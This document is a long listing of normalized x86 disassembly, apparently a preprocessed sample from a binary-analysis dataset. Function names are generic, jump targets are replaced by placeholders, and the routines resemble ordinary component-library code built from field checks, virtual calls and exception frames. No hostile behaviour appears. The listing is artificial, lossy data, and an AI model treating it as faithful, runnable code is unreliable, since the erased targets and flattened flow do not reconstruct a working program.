cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov eax [ rw-data ]
call sub_406654
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_409348
test eax eax
sete dl
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4076c8
mov eax [ ebp - 0x4 ]
call sub_409348
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_43c2dc
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x78 ] edx
mov [ eax + 0x7c ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
sub_40977c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x82 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_409304
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x82 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_409304
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x80 ]
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x18 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
jmp r-xdata
sub_409818
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] 0xffffffff
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_43c504
mov [ ebp - 0xc ] eax
sub_40984c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_409348
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_409600
pop ecx
pop ecx
pop ebp
retn
sub_409874
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_409818
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4096ec
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_406654
sub_4098b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov al [ ebp - 0x5 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x7a ] 0x0
je r-xdata
sub_40990c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40990c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4076c8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40bdb0
sub_409980
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
sub_4099c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_409d48
mov eax [ ebp - 0x8 ]
test [ eax + 0x20 ] 0x1
setne cl
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44222c
mov eax [ ebp - 0x4 ]
mov bx 0xffef
call sub_44c24c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
call [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_409a5c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
pop ecx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
sub_409aa0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_409348
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_409374
mov edx [ eax ]
call [ edx + 0x3c ]
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_409ae0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_409b1c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_409874
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_40984c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_40984c
sub_409b88
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_409bbc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x31 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x31 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40910c
sub_409c04
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_409304
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_4090d4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov dl [ eax + 0x58 ]
mov eax [ ebp - 0x4 ]
call sub_409180
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov dl [ eax + 0x59 ]
mov eax [ ebp - 0x4 ]
call sub_4091f8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x5c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x48 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x4c
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x60 ]
call sub_44cb34
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x4 ]
call sub_409410
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0xffffffff
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_4093ac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x54 ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov dl [ eax + 0x6a ]
mov eax [ ebp - 0x4 ]
call sub_4093e0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov [ edx + 0x80 ] ecx
mov ecx [ eax + 0x34 ]
mov [ edx + 0x84 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x82 ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_409d48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_409304
cmp eax [ ebp - 0x8 ]
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
sub_409d78
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_409dac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_409de0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_409e14
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_409e48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_409e7c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_409eb0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_409ee4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_409f18
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_409f4c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43ce10
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x2d ]
mov eax [ ebp - 0x8 ]
call sub_404d1c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x48 ]
mov eax [ ebp - 0x8 ]
call sub_404d9c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4c ]
mov eax [ ebp - 0x8 ]
call sub_404e1c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_404ea8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_404c10
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x32 ]
mov eax [ ebp - 0x8 ]
call sub_404fb0
mov eax [ ebp - 0x4 ]
push [ eax + 0x84 ]
push [ eax + 0x80 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_409fe8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4425a0
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_409304
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4099c4
sub_40a028
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x70 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_4035ec
mov eax [ ebp - 0x4 ]
call sub_40a0e8
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_403654
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_44222c
sub_40a08c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x70 ]
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40a0e8
sub_40a0b0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax sub_40a0b0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x5c ]
call sub_406b74
push 0x1
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40990c
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40a108
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4484f4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
setne [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ ebp - 0xc ]
call sub_44cfa8
sub_40a14c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_44cb78
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x38 ]
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
sub_40a1dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a326
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44cd60
test eax eax
jle r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44cd60
mov edx eax
sub edx 0x3
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx 0x3
call sub_44cf68
mov eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_44ce70
jne r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov [ ebp - 0x11 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a32d
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_44cb04
retn
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax r-xdata
call sub_44cff0
mov eax [ ebp - 0x4 ]
push [ eax ]
push r-xdata
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx 0x5
call sub_44ce20
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44cd60
mov ecx eax
sub ecx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx 0x1
call sub_44cf68
push [ ebp - 0x20 ]
push r-xdata
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx 0x6
call sub_44ce20
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
mov al [ eax + edx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub_40a364
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
xor ecx ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1d ] dl
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_40a844
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1e ] 0x0
cmp [ ebp - 0x1d ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44cb78
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40a805
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
call sub_409348
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x1c ]
test [ eax + 0x20 ] 0x10
jne r-xdata
lea eax [ ebp - 0x40 ]
mov edx [ ebp - 0x4 ]
call sub_44cb78
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a84b
lea eax [ ebp - 0x58 ]
mov edx 0x4
call sub_44cb04
lea eax [ ebp - 0x40 ]
mov edx 0x3
call sub_44cb04
lea eax [ ebp - 0x18 ]
call sub_44cae0
lea eax [ ebp - 0x4 ]
call sub_44cae0
retn
mov eax [ ebp - 0x1c ]
call sub_40aa80
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x2c ] 0x0
inc [ ebp - 0x28 ]
dec [ ebp - 0x44 ]
jne r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
